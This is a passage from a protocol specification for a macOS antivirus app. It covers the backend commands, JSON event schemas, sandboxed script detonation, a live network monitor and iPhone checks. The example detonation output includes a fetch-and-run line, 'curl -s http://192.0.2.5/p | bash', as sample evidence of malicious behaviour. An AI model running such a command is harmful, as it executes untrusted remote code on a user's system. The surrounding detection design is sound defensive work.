# Cerber.app ⇄ backend protocol

The macOS app (SwiftUI, `app/Sources`) never scans anything itself. It starts the Python backend
as a child process and renders the events it prints.

```
<ROOT>/.venv/bin/python -m cerber.gui_backend <command> [args] [--ai] [--fast]
cwd = <ROOT>   (ROOT = the Cerber project folder, e.g. /Users/jan/Documents/antywirus)
```

* **stdout**: JSON Lines, one event object per line (UTF-8). Nothing else is ever printed there.
* **stderr**: free-form debug log (the app may show it in a "Szczegóły techniczne" disclosure).
* **exit code**: 0 = finished (also when threats were found), 1 = fatal error, 130 = cancelled.
* **cancel**: send `SIGINT` to the backend process. A file scan stops and still emits `done` with
  `"cancelled": true` and partial results. If no `done` arrives within 10 s, send `SIGTERM`.
* The backend never installs anything, never starts at login, and exits when the command is done.

## Commands

| command | args | what it does |
|---|---|---|
| `info` | – | database statistics (fast, < 1 s; does not load the engines) |
| `scan` | `PATH [PATH …]` | scan files / folders in place (modes "Plik lub folder" and "Lokalizacja") |
| `sandbox` | `ARCHIVE` | copy the archive into an isolated workspace, unpack it inside a macOS sandbox (no network, writes only to the workspace, resource limits), scan everything, delete the workspace |
| `github` | `URL` | download a public GitHub repository as an archive, then exactly what `sandbox` does |
| `huggingface` | `URL` | Hugging Face model / dataset / Space (`https://huggingface.co/org/name`, `…/datasets/…`, `…/spaces/…`): download code, configs and every format that can execute code (pickle `.bin/.pt/.pth/.ckpt/.pkl`, Keras `.h5/.keras`, …) plus the headers of safe formats (safetensors, GGUF), then exactly what `sandbox` does; model files are checked for malicious pickle imports, Keras Lambda code, dangerous chat templates and `trust_remote_code` Python |
| `url` | `URL` | "Sprawdź link": reconnaissance of an http(s) link (redirects, DNS/IP, TLS, IOC lists), then download what it points to – the file, or every downloadable file linked from an HTML page – **inside the sandbox**, unpack and scan exactly like `sandbox`; the user learns whether it is safe before downloading it |
| `laptop` | – | the computer, scope and depth by `--level` (see below): key locations or every data folder (`/Applications`, `/Users`, `/Library`, `/opt`, `/usr/local`, `/private` …), environment and network audit for the higher levels. `deep`/`mega` take hours. |
| `quarantine` | `PATH` | move one file into Cerber's quarantine |
| `history` | – | list of reports saved by previous app scans |
| `iphone` | `devices` \| `scan [UDID] [--make-backup]` \| `backup PATH` | "iPhone (kabel)": list connected/paired iPhones and local backups; check a phone (what it reports + its newest local backup, optionally a fresh backup first) or an existing backup folder – MVT-style, against public iOS spyware/stalkerware indicators. See "iPhone (kabel)" below. |
| `ai-install` | – | download the local AI model (Cisco Foundation-Sec 1.1 8B Instruct, Q4_K_M GGUF, ~4.9 GB) – resumable, SHA-256 verified; if another process is already downloading, follows that download's progress. Emits `stage` `download` + `progress` (`bytes`, `total`) about twice a second, then `ai_installed` (immediately if already installed). Failure: `error` fatal, exit 1. SIGINT/SIGTERM cancels (exit 130; resumes next time). The app starts it **only when the user clicks** "Pobierz model AI (4,9 GB)" (or "Pobierz lepszy model AI" when `info.ai_upgrade_available`) – never automatically at launch (owner's rule: nothing in the background without asking); independent from scans, which may run at the same time. An older model on disk is never deleted. |

Flags: `--level quick|patterns|deep|mega` (default `deep`), `--ai` = additionally let the local model
verify the engines' accusations against grey-zone files (see `ai` below). Only `mega` uses AI by default (whenever the model is available); the app
passes `--ai` explicitly for `mega`, and on the target screens (file/folder, location, archive, GitHub,
Hugging Face, link) only when the optional "Analiza AI" toggle is on – default off, remembered per user –
and never when the model or the `llama-server` engine is missing.

**Every scan runs in a sandbox.** `sandbox`/`github`/`huggingface`/`url` unpack into an isolated workspace;
`scan` and `laptop` scan files in place inside a read-only sandbox (no network, no writes outside the reports
folder). All of them emit a `sandbox` stage and a non-null `summary.sandbox`. Before scanning, the sandbox
checks itself (tries to write outside, connect to the network, trigger TCC prompts …); the passed checks are
listed in `summary.sandbox.verified`. If any check fails, the backend emits
`{"ev": "sandbox_violation", "problems": ["…", …]}` followed by a fatal `error` – the scan is aborted.

### Scan levels (the "Przeskanuj" choice)

| level | Polish label | engines | where (for `laptop`) |
|---|---|---|---|
| `quick` | **Szybki** – „lekko, na szybko” | patterns only: hashes, ClamAV, YARA, IOC; archives are still unpacked; no heuristics, no TLSH, no codesign | only key locations: Pobrane, Biurko, Aplikacje, autostart (LaunchAgents/Daemons), /tmp, /Users/Shared, ~/Library/Application Support |
| `patterns` | **Średni** – cały laptop, tylko wzorce | same as quick | whole computer |
| `deep` | **Dokładny** – „na poważnie” | everything: all heuristics, deobfuscation, TLSH similarity, code-signature checks + environment scan (autostart, processes, browser extensions, security settings) | whole computer |
| `mega` | **Mega** – najmocniejszy | deep + network & remote-access audit (ports in/out, connections, traffic per process, remote logins, remote-control tools, tunnels, MDM) + live network monitor for the rest of the scan + AI review | whole computer |

`scan`, `sandbox`, `github`, `huggingface`, `url` ALWAYS run at `deep` (no level picker in the app, never the network audit);
the level picker exists only on the "Przeskanuj laptop" screen. The optional `--ai` checkbox may be offered everywhere.
`laptop --level quick` is the fast "check the usual places" scan; only `mega` produces `summary.network`;
`deep` and `mega` produce `summary.environment`.

## Events

Every event has `"ev"`. Unknown events/fields must be ignored by the app.

```jsonc
{"ev": "info", "patterns_total": 7215172, "clamav_signatures": 428287, "yara_rules": 13356,
 "file_hashes": 4012345, "section_hashes": 2700000, "ioc_indicators": 125000,
 "db_built": "2026-09-29 14:16", "ai_model": "foundation-sec-1.1-8b-instruct-q4_k_m.gguf" | null, "missing": [],
 "ai_installable": true,                 // the backend can download the model itself (`ai-install`)
 "ai_model_size": 4920780160,            // bytes of the full (recommended) model file
 "ai_model_recommended": "foundation-sec-1.1-8b-instruct-q4_k_m.gguf",
 "ai_upgrade_available": false,          // an older model (Granite) is in use; the app offers the recommended one
 "ai_download_partial": 1610612736,      // bytes already in the resumable .part file (0 if none)
 "llama_server": true | false}           // the llama-server engine needed to run the model was found

{"ev": "stage", "id": "check|download|sandbox|extract|load|enumerate|env|network|scan|cloud|behavior|ai|report", "title": "Ładowanie baz sygnatur…"}
// typical orders – scan: sandbox, load, enumerate, scan, [behavior], [ai], report
//   laptop: [env], [network], sandbox, load, enumerate, scan, [cloud], [behavior], [ai], report
//           ([behavior] only deep/mega, [cloud] only mega)
//   sandbox: sandbox, extract, load, scan, [behavior], [ai], report     github/huggingface: download, then like sandbox
//   url: check, download, then like sandbox                              ai-install: download
// `behavior` ("Analiza zachowania") comes ONLY when the scan flagged a script worth running, so the app never shows
// it as a pending step in advance – the stage event inserts it after the stages already visited.
// `cloud` ("Pliki z chmury", Mega only) works the same way: it comes only when the walk met risky files kept only in
// iCloud/another cloud drive (programs, scripts, installers, archives, active documents) – they are downloaded,
// scanned in the sandbox and given back to the cloud afterwards (flagged ones stay on disk).
{"ev": "log", "msg": "free text (Polish)"}

{"ev": "progress", "stage": "enumerate", "found": 15400}
{"ev": "progress", "stage": "download", "bytes": 1048576, "total": 5242880 | null,
 "files": 1, "files_total": 3}                                   // files/files_total only for `url`
{"ev": "progress", "stage": "extract", "files": 120, "bytes": 3400000}
{"ev": "progress", "stage": "scan", "done": 120, "total": 15400, "bytes": 9000000, "rate_mbs": 24.5,
 "flagged": 2, "current": "/Users/x/Downloads/a.zip", "eta_s": 300 | null}
{"ev": "progress", "stage": "behavior", "done": 0, "total": 2, "current": "det/update_helper.sh"}
// done = scripts finished (sent before each script and once more with done = total at the end)
{"ev": "progress", "stage": "cloud", "done": 3, "total": 40, "current": "Setup.dmg"}   // files downloaded so far

{"ev": "finding", "item": RESULT}          // a flagged file, as soon as it is known (live list); during `behavior`
                                           // the same file (same path/worst_object) may be re-sent with a raised
                                           // verdict, extra detections and `detonation` – the app updates it in place

{"ev": "done", "summary": SUMMARY}
{"ev": "error", "msg": "Polish text", "fatal": true|false}
{"ev": "quarantined", "path": "...", "id": "b50430aa269e4f00"}
{"ev": "history", "items": [{"id": "gui-20261006-101500", "mode": "scan", "title": "...", "verdict": "CLEAN",
                              "started": "2026-10-06 10:15:00", "files": 120, "report_html": "...", "report_json": "..."}]}
{"ev": "sandbox_violation", "problems": ["…"]}                // sandbox self-check failed; a fatal error follows
{"ev": "ai_installed", "model": "foundation-sec-1.1-8b-instruct-q4_k_m.gguf", "path": "/…/foundation-sec-1.1-8b-instruct-q4_k_m.gguf",
 "llama_server": "/opt/homebrew/bin/llama-server" | null}     // `ai-install` finished (app re-runs `info`)

// `laptop --level mega` only – the live network monitor (see below)
{"ev": "net_status", "active": true, "since": "2026-10-07 12:00:01", "polls": 42, "interval_s": 5,
 "connections_new": 37, "public_new": 21, "listening_new": 1, "inbound": 0, "sessions_new": 0,
 "processes_remote": 0, "uploaded_bytes": 12345678, "alerts": 1}
{"ev": "net_event", "item": NET_EVENT}
```

### Live network monitor (Mega)

Only `laptop --level mega`. Right after the start audit (stage `network`) the backend keeps polling the network
every `interval_s` (5 s) for the whole rest of the scan session – file search, scanning, AI – and reports only
what is **new since the monitor started**: new outgoing connections, new listening ports, someone connecting
in, new login sessions, newly started remote-access tools / tunnels and large uploads during the session.
It stops when the scan ends (also when cancelled).

* `net_status` – after every poll; the last one (at the end) has `"active": false`. The counters are cumulative
  since `since`: `connections_new` (all new connections), `public_new` (of those, to the Internet),
  `listening_new`, `inbound` (connections into this Mac), `sessions_new` (new login sessions),
  `processes_remote` (newly started remote-access tools / tunnels), `uploaded_bytes` (sent during the session),
  `alerts` (events with severity ≥ `low`).
* `net_event` – one notable change, as soon as it is seen. These events arrive while the stage is
  `enumerate` / `scan` / `ai`; they are not stages and never change the stepper.

```jsonc
NET_EVENT = {"id": "ne-12", "time": "12:03:44",
             "kind": "connection|listen|inbound|session|process|traffic",
             "severity": "info|low|suspicious|pua|malicious",
             "title": "Nowe połączenie skryptu na nietypowym porcie: python3 → 185.220.101.4:9001",
             "detail": "…",
             "process": "python3", "pid": 123, "exe": "/usr/bin/python3",          // any of these six
             "remote": "185.220.101.4:9001", "host": "example.com", "signer": "Apple"}   // may be null or missing
```

`info` = notable but harmless (e.g. a signed app opened a port, an Apple device from the LAN connected) – the app
shows it in neutral grey; `low` = mild (yellow); `suspicious`/`pua` = orange; `malicious` = red. The app shows a
"Sieć na żywo" card on the progress screen (live indicator, counters, the latest 5 events; it keeps at most
300 events) and the `network.monitor` section in the results.

### RESULT (one scanned file with something found)

```jsonc
{"path": "/abs/path or /sandbox/relative/path", "display_path": "repo/src/x.js",
 "verdict": "MALICIOUS|PUA|SUSPICIOUS|INFO", "score": 130, "primary": "ClamAV:Eicar-Test-Signature",
 "size": 68, "ftype": "zip", "sha256": "…",
 "worst_object": "a.zip>>folder/inner.txt" | null,
 "can_quarantine": true,            // false for sandbox/github copies (they are deleted anyway)
 "quarantined": "id" | null,
 "ai": {"mode": "verify", "model": "foundation-sec-1.1-8b-instruct-q4_k_m.gguf",  // AI accusation verifier
        "accusations": [{"id": "A1", "name": "Heur:SHELL.PipeToShell", "engine": "heuristic",   // cerber/engines/ai.py
                         "strength": "HIGH", "score": 30,              // the engine finding being judged
                         "verdict": "confirmed" | "refuted" | "unsure", // UI: trafny / chybiony / niepewne
                         "confidence": 0.85, "agree": true,            // both passes (opposite order) agreed
                         "grounded": true,                             // its quote really occurs in the file
                         "quote": "curl … | bash", "reason_pl": "…",
                         "points": 6}],                                // + / − points for this accusation
        "family_match": "same" | "similar" | "different" | "benign",  // is it the suspected family?
        "family": "Atomic macOS Stealer (AMOS)" | null, "family_id": "amos" | null, "category": "stealer",
        "choice": "amos" | "other" | "benign",                         // compat (older family classifier)
        "verdict": "malicious" | "clean", "confidence": 0.8, "agree": true, "grounded": 1.0,
        "summary_pl": "...", "reasons": ["quote…"], "options": [{"id": "amos", "name": "…", "cited": 2}, …],
        "points": 12, "points_raw": 14, "family_points": 3, "cap": 15} | null,
        // never final: refuted (≥0.75) −50 % / (≥0.55) −25 % of that accusation's points, only for SUSPICIOUS/INFO
        // files without CERTAIN hits; confirmed +20 % / +10 % (≤ 8 each); family same +5/+3, similar +3; total ±15.
        // CERTAIN/hash/ClamAV/IOC/sandbox findings are never judged; never CLEAN; MALICIOUS only with static ≥ 65.
        // One detection "AI:Verify[.Confirmed|.Refuted]" or "AI:Family.X" carries the signed total.
        // Older reports: only choice/family/confidence/summary_pl (family classifier).
 "detections": [{"name": "...", "engine": "clamav|yara|hash|heuristic|ioc|fuzzy|macos|ai|env|detonate",
                 "confidence": "CERTAIN|HIGH|MEDIUM|LOW|INFO", "score": 100,
                 "description": "...", "object": "a.zip>>folder/inner.txt", "pua": false}],
 "detonation": DETONATION | null}           // null when the script was not run in the behaviour sandbox
```

### DETONATION ("Analiza zachowania" – stage `behavior`)

Suspicious or obfuscated shell / Python scripts found by the static scan (modes scan, sandbox, github, huggingface,
url and laptop deep/mega; at most 8 per scan, worst first) are run for a few seconds in a sealed sandbox: no network
(also no DNS), a FAKE home folder full of bait files (keychain, browser passwords, SSH keys, wallets), nothing but the
interpreter and data tools may start. What a script tries to do can only raise its verdict, never lower it.
Detections it adds have `"engine": "detonate"` and names starting with `Behav:` (e.g. `Behav:Script.DownloadExec`);
decoded hidden stages are re-scanned statically and add heuristic detections named `Behav:Stage.…`.
The app labels the engine "Sandbox (zachowanie)".

```jsonc
{"ran": true, "kind": "bash|python|…", "seconds": 10.9, "timed_out": false,
 "verdict": "CLEAN|INFO|SUSPICIOUS|PUA|MALICIOUS", "score": 95,
 "behaviors": [{"id": "download_exec", "title": "Pobranie i uruchomienie kodu", "detail": "…", "score": 40,
                "severity": "critical|high|medium|low|info", "evidence": ["curl -s http://192.0.2.5/p | bash", …]}],  // ≤ 30
 "commands": ["curl -s http://192.0.2.5/p", …],                          // in execution order, ≤ 40
 "network": [{"target": "192.0.2.5", "kind": "ip|domain|…", "url": "http://192.0.2.5/p" | null, "port": 443 | null,
              "ioc": null | "ThreatFox: …"}],                             // attempts – all blocked, ≤ 30
 "files_read": ["~/Library/Keychains/login.keychain-db"],                // bait files it reached for, ≤ 40
 "files_written": ["~/Library/LaunchAgents/x.plist"],                    // write attempts (device nodes like /dev/tty are noise), ≤ 40
 "stages": [{"source_preview": "decoded second stage…", "detections": ["Heur:SHELL.PipeToShell"]}],   // ≤ 5, preview ≤ 600 chars
 "limitations": ["…"]}
```

In the results (Files tab, expanded file) the app shows a "Zachowanie w zamkniętym sandboksie" section; the live list
and the file row show a "Zachowanie" tag.

### SUMMARY

```jsonc
{"mode": "scan|sandbox|github|huggingface|url|laptop", "level": "quick|patterns|deep|mega", "title": "Downloads", "started": "…", "finished": "…",
 "seconds": 12.3, "cancelled": false,
 "verdict": "CLEAN|INFO|SUSPICIOUS|PUA|MALICIOUS",      // worst of files + environment + network
 "files": 1200, "bytes": 123456789, "objects": 5400, "patterns_total": 7215172,
 "counts": {"CLEAN": 1195, "INFO": 3, "SUSPICIOUS": 1, "PUA": 0, "MALICIOUS": 1},
 "results": [RESULT, …],                                // flagged files, worst first (INFO included)
 "skipped": 3, "errors": ["…"],
 "cloud_only": 5120,                                    // iCloud/cloud-drive placeholders NOT downloaded (still only in the cloud)
 "cloud_fetch": null | {"candidates": 42, "fetched": 40, "bytes": 812000000,   // Mega: risky cloud-only files downloaded
                        "evicted": 39, "kept": 1,       // given back to the cloud / left on disk because flagged
                        "over_limit": 0, "too_big": 2, "failed": 0, "stalled": false,
                        "kinds": {"programy i skrypty": 12, "instalatory i archiwa": 20, "dokumenty": 8},
                        "dirs_listed": 3, "dirs_left": 0, "local": 0, "scanned": 40},
 "report_html": "/…/reports/gui-….html", "report_json": "/…/reports/gui-….json",

 "sandbox": null | {"extracted_files": 340, "extracted_bytes": 9000000, "depth": 2,
                    "tree": [{"path": "folder/a.js", "size": 123, "verdict": "CLEAN"}],   // first 2000 entries
                    "limits_hit": ["…"], "isolation": ["brak sieci", "zapis tylko do katalogu roboczego", …],
                    "verified": ["zapis poza sandboksem zablokowany", "połączenia sieciowe zablokowane",
                                 "prośby o uprawnienia (TCC) zablokowane", …]},   // self-checks passed before the scan (every mode)
                // for `scan` / `laptop` (in-place, read-only sandbox) ONLY:
                // {"isolation": ["brak dostępu do sieci", "system plików tylko do odczytu", …], "verified": […], "mode": "readonly"}
 "repo": null | {"source": "github|huggingface", "owner": "x", "name": "y", "kind": "repo|model|dataset|space",
                 "ref": "main", "url": "https://github.com/x/y", "description": "…", "stars": 12,
                 "archive_bytes": 123456,
                 "files_total": 40, "files_downloaded": 38,
                 "skipped": [{"path": "model-00001.safetensors", "size": 4900000000, "reason": "bezpieczny format – sprawdzono nagłówek"}]},

 "url": null | URL_INFO,                                  // only for `url`
 "environment": null | {"findings": [ENV_FINDING, …], "posture": {"sip": true, "gatekeeper": true, "filevault": true,
                         "firewall": "on|off|block_all", "xprotect_version": "…", …}, "limitations": ["…"]},
 "network": null | NETWORK}
```

`URL_INFO` (mode `url`; the verdict may be MALICIOUS purely from `ioc`, `results` may then be empty):

```jsonc
{"input": "https://bit.ly/x", "final_url": "https://example.com/setup.zip",
 "redirects": ["https://bit.ly/x", "https://example.com/setup.zip"],      // the whole chain, input first
 "status": 200, "content_type": "application/zip", "server": "nginx" | null,
 "domain": "example.com", "ip": "93.184.216.34" | null,
 "tls": {"issuer": "Let's Encrypt R11", "subject": "example.com", "expires": "2026-12-01", "version": "TLSv1.3"} | null,
 "ioc": ["URLhaus: … (malware_download)"],                 // hits of the URL/domain/IP in local threat lists
 "page": {"title": "…", "links_found": 12} | null,          // when the link was an HTML page
 "files": [{"name": "setup.zip", "url": "…", "size": 123, "content_type": "…", "sha256": "…"}],
 "skipped": [{"url": "…", "reason": "…"}], "notes": ["…"]}
```

`ENV_FINDING = {"category": "persistence|artifacts|process|network|network_live|syslog|lan|certs|remote_access|posture|browser|ssh|profile|…",
"title": "…", "location": "…", "severity": "malicious|pua|suspicious|low|info", "score": 45,
"description": "…", "evidence": ["…"]}`

`artifacts` ("Znane ślady malware" in the app; deep/mega) = files, LaunchAgents, bundles or processes known from a named
malware family – the title names it, e.g. "Ślady Atomic Stealer (AMOS): 3 artefakty".

`syslog` ("Logi systemowe"), `lan` ("Sieć lokalna"), `certs` ("Certyfikaty") = findings of the Mega start audit from
the system log history, the local network and manually trusted certificates (details in `network.syslog`, `.lan`,
`.certificates`).

`network_live` ("Sieć na żywo" in the app) = an alert of the live network monitor (Mega): every monitor event with
severity ≥ `low` is also added to `environment.findings`, so it counts in the overall verdict.

### NETWORK (only for `laptop --level mega`)

Every key is optional for the app. If the start audit failed, `network` may contain **only** `monitor`;
older reports and non-Mega scans have no `monitor`.

```jsonc
{"boot_time": "2026-10-01 08:00:00",
 "summary": {"listening_all_interfaces": 4, "public_connections": 37, "processes_online": 21,
             "remote_tools": 1, "ioc_hits": 0, "uploaded_bytes_since_boot": 123456789},
 "listening": [{"proto": "tcp4", "address": "*", "port": 5900, "exposure": "all|localhost|specific",
                "process": "screensharingd", "pid": 123, "exe": "/…", "signer": "Apple",
                "service": "Udostępnianie ekranu" | null}],
 "connections": [{"process": "Google Chrome", "pid": 1, "exe": "/…", "remote": "142.250.1.1", "port": 443,
                  "host": "fra16s.1e100.net" | null, "state": "ESTABLISHED", "public": true,
                  "ioc": null | "ThreatFox: … botnet C2"}],
 "traffic": [{"process": "…", "pid": 1, "exe": "/…", "bytes_out": 123, "bytes_in": 456, "signer": "…"}],   // since boot, top 60
 "traffic_history": {"available": false, "reason": "wymaga uprawnień administratora",
                     "items": [{"process": "…", "bytes_out": 1, "bytes_in": 2, "first_seen": "…", "last_seen": "…"}]},
 "remote_access": [{"name": "Udostępnianie ekranu", "kind": "macos_service|app|tunnel|mdm|ssh_keys|session",
                    "status": "enabled|running|installed|disabled|present", "detail": "…",
                    "risk": "info|low|suspicious|malicious"}],
 "sessions": [{"user": "jan", "tty": "ttys001", "from": "192.168.1.5" | null, "since": "…"}],
 "logins": [{"user": "jan", "tty": "ssh", "from": "203.0.113.5" | null, "when": "…", "remote": true}],
 "syslog": null | SYSLOG, "lan": null | LAN, "certificates": null | [TRUSTED_CERT, …],   // deep part of the start audit
 "monitor": null | {                                    // live monitor during the rest of the scan (Mega)
   "started": "2026-10-07 12:00:01", "ended": "2026-10-07 13:10:00", "seconds": 4199, "polls": 700, "interval_s": 5,
   "stats": {"connections_new": 37, "public_new": 21, "listening_new": 1, "inbound": 0, "sessions_new": 0,
             "processes_remote": 0, "uploaded_bytes": 12345678, "alerts": 1},   // same counters as the last net_status
   "events": [NET_EVENT, …],                                                    // up to 300
   "new_public": [{"time": "12:03:44", "process": "Google Chrome Helper", "pid": 812, "exe": "/Applications/…",
                   "remote": "142.250.1.1", "port": 443, "host": "waw02s.1e100.net" | null,
                   "signer": "Developer ID: Google LLC" | null}, …],           // new Internet connections, up to 300
   "uploads": [{"process": "rclone", "pid": 4411, "exe": "/opt/homebrew/bin/rclone", "bytes_out": 734003200,
                "bytes_in": 1200, "signer": "…" | null}, …],                    // biggest senders during the session, up to 15
   "limitations": ["…polish text…"]}}
```

In the results ("Sieć i zdalny dostęp") the monitor section "W trakcie skanu (monitor na żywo)" is shown first when
it has alerts (or when the start audit is missing), otherwise right after the start-audit summary tiles.

`syslog`, `lan` and `certificates` are optional (older reports lack them). `certificates: []` means "checked, none
trusted by hand" (the app says so in green); a missing key means "not checked".

```jsonc
SYSLOG = {"available": true, "reason": null | "polish text",          // available=false → the app shows `reason` in grey
  "window": {"from": "2026-09-30 14:14", "to": "2026-10-07 14:14", "days": {"security": 7.0, "privacy": 0.5},
             "persist_since": "2026-10-06 20:55",                     // oldest detailed log file: real reach of the history
             "special_since": "2026-09-22 16:15"},
  "counts": {"xprotect_scans": 58, "xprotect_detections": 0, "xprotect_blocks": 0, "gatekeeper_blocks": 0,
             "gatekeeper_overrides": 0, "ssh_accepted": 0, "ssh_failed": 0, "screen_sharing_ok": 0,
             "screen_sharing_failed": 0, "auth_failures": 0, "privileged_authorizations": 0, "new_login_items": 0,
             "privacy_prompts": 0, "events_total": 1},
  "events": [{"time": "2026-10-07 09:12",
              "category": "xprotect|gatekeeper|remote_login|screen_sharing|login_failure|authorization|persistence|privacy",
              "title": "…", "detail": "…", "severity": "info|low|suspicious|pua|malicious", "process": "…"}]}   // ≤ 200, worst first

LAN = {"gateway": {"ip": "172.20.10.1", "mac": "02:00:00:00:00:01", "interface": "en0", "mac_randomized": true},
  "wifi": {"interface": "en0", "connected": true, "security": "WPA3_SAE",
           "security_level": "open|wep|wpa|wpa2|wpa3|enterprise|owe|unknown", "security_label": "WPA3",
           "ssid": null, "source": "ipconfig"},
  "dhcp": {"dhcp_server": "…", "router": "…", "dns": ["…"], "domain": "…", "router_arp_verified": true},
  "arp_entries": 3,
  "arp_suspicious": [{"mac": "…", "ips": ["…"], "reason": "polish text"}],        // possible ARP spoofing
  "arp_multi_ip": [{"mac": "…", "interface": "en0", "ips": ["…"]}],
  "ipv6_routers": [{"router": "fe80::…", "interface": "en0", "pref": "medium", "expire": "29m"}]}

TRUSTED_CERT = {"name": "…", "domain": "user|admin", "trust": "all|ssl|other|deny|unspecified", "policies": ["sslServer"],
  "subject": "…", "issuer": "…", "not_before": "…", "not_after": "…", "expired": false, "is_ca": true,
  "self_signed": true, "sha256": "…",
  "kind": "interception_tool|adware|impersonation|enterprise|antivirus_filter|dev|unknown|system_duplicate|distrusted",
  "tool": "Charles Proxy" | null, "risk": "info|low|suspicious|malicious", "explanation": "polish text"}
```

The app shows them in the start-audit part of the Network tab as three cards: "Sieć lokalna" (Wi‑Fi security badge:
open/wep red, wpa orange, wpa2/wpa3/enterprise/owe green), "Certyfikaty zaufane ręcznie" and
"Logi systemowe (ostatnie N dni)" (count tiles, events, the "macOS keeps detailed entries since …" note).

## Background protection ("Ochrona w tle")

Not a `gui_backend` command – a separate long-running process started by the app only while the user has the
feature switched on (never at login unless the user also enabled "Uruchamiaj Cerbera przy logowaniu",
which registers the app itself via `SMAppService.mainApp`):

```
<ROOT>/.venv/bin/python -m cerber watch run --app [--level quick|deep] [--quarantine] [--net] [--idle 600]
cwd = <ROOT>, stdin = a pipe the app keeps open (EOF on stdin = stop, so the watcher dies with the app)
```

It watches ~/Downloads, ~/Desktop, /Applications, ~/Applications, LaunchAgents/Daemons, PrivilegedHelperTools,
/var/db/receipts (pkg installs), /opt/homebrew/bin, /usr/local/bin and browser extension folders, and scans
every new item like the quick laptop scan, inside the sandbox. Stops on SIGINT/SIGTERM (app: SIGINT + close
stdin, SIGTERM after 5 s). stdout events:

```jsonc
{"ev": "watch_ready", "level": "quick", "quarantine": true,
 "spots": [{"kind": "download", "kind_pl": "pobrane", "path": "…", "ok": true, "error": null}, …]}  // ok=false: TCC not granted yet, retried every 60 s
{"ev": "watch_new", "kind": "…", "kind_pl": "…", "path": "…", "name": "…"}            // appeared, waiting until it stops changing
{"ev": "watch_scanning", "kind", "kind_pl", "path", "name", "note"}
{"ev": "watch_worker", "state": "loading|ready|stopped", "patterns": 7215172}          // engine (2.6 GB) loads on demand, unloads after --idle s
{"ev": "watch_sandbox", "verified": ["…"]}                                             // sandbox self-check passed
{"ev": "watch_result", "kind", "kind_pl", "path", "name", "note",
 "verdict": "CLEAN|INFO|SUSPICIOUS|PUA|MALICIOUS", "files": 12, "scanned": 12, "seconds": 3.1,
 "flagged": [{"path", "verdict", "primary", "score", "quarantined": "id" | null, "quarantine_error": "…" | null}],
 "report": "/…/reports/watch-….html" | null, "time": "2026-10-06 22:50:12"}
{"ev": "watch_notice", "title": "Cerber ✅ czysty", "subtitle": "…", "msg": "…", "level": "info|warning|error"}   // ready-made notification texts
{"ev": "watch_alert", "title": "…", "msg": "…", "report": "…"}                        // confirmed malware (already quarantined if possible)
```

`--net` (off by default, the "Nadzór sieci i zdalnego dostępu" switch) adds the network & remote-access guard:
envscan.netwatch in guard mode inside the `env` sandbox (every 10 s: new connections – IOC addresses, scripts
and unsigned programs on unusual ports, beaconing –, newly opened ports, inbound connections, `who` sessions,
remote-control tools and tunnels, new privacy permissions in TCC.db, shell start-up files, gateway MAC, big
uploads, new programs in /tmp and /Users/Shared) plus the unified log every 5 min (read by the unsandboxed
watcher with `log show --start/--end`, analysed in the sandbox: SSH / screen-sharing logins, password
guessing, admin rights, privacy prompts, XProtect). No reverse DNS, nothing is sent anywhere. Programs it
raises an alarm about are scanned like downloads (kind `network`, quiet unless flagged). Extra events:

```jsonc
{"ev": "watch_ready", …, "net": true, "net_report": "/…/reports/siec-20261010.html"}
{"ev": "watch_net", "item": {"id": "ne-3", "time": "10:12:31", "kind": "connection|listen|inbound|session|process|traffic|autostart|file|gateway|log|permission",
 "severity": "info|low|suspicious|pua|malicious", "score": 45, "title": "…", "detail": "…", "process": "…", "pid": 901,
 "exe": "…", "remote": "ip:port", "host": null, "signer": "…", "date": "2026-10-10"}, "report": "/…/siec-20261010.html"}
{"ev": "watch_net_status", "active": true, "since": "…", "polls": 120, "interval_s": 10.0, "log_checked": "2026-10-10 10:12:19",
 "permissions": false, "limitations": ["…"], "connections_new": 41, "public_new": 17, "listening_new": 1, "inbound": 1,
 "sessions_new": 0, "processes_remote": 1, "uploaded_bytes": 48000000, "alerts": 1, "report": "…",
 "error": "…"}   // every ~30 s; active=false when the guard stops (error: it gave up after repeated crashes)
```

Alarms (suspicious and up) also come as `watch_notice` (at most 6 per 10 min). The daily report
`reports/siec-YYYYMMDD.{json,html}` is rewritten within seconds of an alarm and every 5 min; restarts on the same
day continue it. The unified-log position is kept in `~/Library/Logs/Cerber/netguard-state.json` (after a
break at most one day back).

## Reports inside the app

HTML reports open in a Cerber window (WKWebView, page JavaScript off, no network, links to web pages go to the
browser). Scan reports carry `<a class="qbtn" data-i="N" href="cerber-report://quarantine/N">Do kwarantanny</a>`
next to high-risk real files (`report.high_risk`: MALICIOUS, or SUSPICIOUS/PUA from 60 points; not archive
members, not already quarantined). The link is hidden by the report's own CSS (`.qbtn{display:none}`), so it does
nothing in a browser; the app's window shows it, re-checks result N in the JSON twin (same stem, `.json`) and that
the file still exists, then runs `quarantine <path>`.

The app shows notices as macOS notifications (an info "Sprawdzam…" notice is dropped when the result arrives
within 3 s), alerts as notifications with a "Pokaż raport" action, keeps the last 500 events in an "Aktywność"
feed and, while the feature is on, a menu bar item (closing the window does not quit the app).

## Local HTTP API ("API (localhost)")

Optional, off by default, only while the app runs:
`<ROOT>/.venv/bin/python -m cerber.api_server --port 8765 --token T` (cwd ROOT). The app generates the token
(32 random bytes, base64url), keeps it in the Keychain and passes it on every start. The server prints exactly
one line `{"ev": "api_ready", "url": "http://127.0.0.1:8765", "token": "…", "docs": "http://127.0.0.1:8765/"}`
and serves until SIGINT/SIGTERM (app: SIGINT, SIGTERM after 5 s); stderr is the request log. All `/api/*`
calls need `Authorization: Bearer <token>`.

## iPhone (kabel)

`<ROOT>/.venv/bin/python -m cerber.gui_backend iphone …` (code: `cerber/iphone.py`, indicators: `cerber/feeds_ios.py` →
`db/compiled/ios_ioc.sqlite`, rebuilt only by `./cerber.sh update` / `update --only-ios`). Nothing runs on its own: the
app lists devices when the screen opens; a check, and above all a backup, starts only after a click.

* An iPhone's file system cannot be read without a jailbreak, so – like Amnesty's MVT – the check analyses a **local
  backup** (Finder's `~/Library/Application Support/MobileSync/Backup/<UDID>`, readable only with "Pełny dostęp do
  dysku", or Cerber's own `<ROOT>/iphone_backups/<UDID>` made by `idevicebackup2`) plus what the phone itself reports
  (device info, app list with signer, provisioning profiles, crash reports copied with `--keep`).
* Device access happens in the unsandboxed backend with fixed argv, no shell: libimobiledevice from
  `/opt/homebrew/bin` / `/usr/local/bin` when installed, Xcode's `devicectl` when present, Apple's `AppleMobileBackup`
  (MobileDevice.framework) for backups without libimobiledevice, `system_profiler` for USB. Nothing is installed and
  nothing on the phone or in the backup is modified.
* Everything that came from the phone or the backup (plists, SQLite, crash logs) is parsed by `inner-iphone` inside the
